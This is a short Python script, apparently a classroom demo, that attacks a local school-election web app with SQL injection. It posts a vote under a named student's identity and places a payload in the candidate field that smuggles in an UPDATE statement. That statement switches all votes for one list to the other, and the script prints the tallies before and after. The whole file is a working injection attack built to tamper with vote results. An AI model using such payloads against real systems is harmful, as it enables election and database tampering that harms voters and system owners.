import requests
import time

URL_VOTA = "http://localhost:3000/vota"
URL_RISULTATI = "http://localhost:3000/risultati"

# Usiamo l'identità di uno studente che ha diritto di voto (es. Sara Verdi)
identity = {
    "nome": "Chiara",
    "cognome": "Maisto",
    "classe": "5N"
}

print("=== OPERAZIONE: SWAP SILENZIOSO ===")

# 1. Controlliamo la situazione prima dell'attacco
print("\n[!] Situazione pre-attacco (Scrutinio regolare):")
try:
    current = requests.get(URL_RISULTATI).json()
    for r in current:
        print(f"    - {r['candidato']}: {r['conteggio']} voti")
except:
    print("    Database vuoto o errore.")

# 2. Prepariamo il payload di manipolazione
# Trasformiamo tutti i voti della Lista 1 nella Lista 2
payload = "Lista 2'); UPDATE voti_anonimi SET candidato = 'Lista 2 - Studenti Uniti' WHERE candidato = 'Lista 1 - Innovazione'; --"

data = { **identity, "candidato": payload }

print(f"\n[ATTACCO] Iniezione del virus di scambio in corso...")
time.sleep(2) # Pausa drammatica per la presentazione

try:
    response = requests.post(URL_VOTA, json=data)
    if response.status_code == 200:
        print("[SUCCESS] Payload iniettato con successo.")
    else:
        print(f"[ERROR] Il server ha risposto: {response.text}")

    # 3. Verifichiamo il risultato finale
    print("\n[!] Situazione POST-ATTACCO (Risultato manipolato):")
    final = requests.get(URL_RISULTATI).json()
    for r in final:
        print(f"    - {r['candidato']}: {r['conteggio']} voti")

    print("\n[RIFLESSIONE] Notate come la Lista 1 sia sparita o diminuita drasticamente?")

except Exception as e:
    print(f"[-] Errore durante l'attacco: {e}")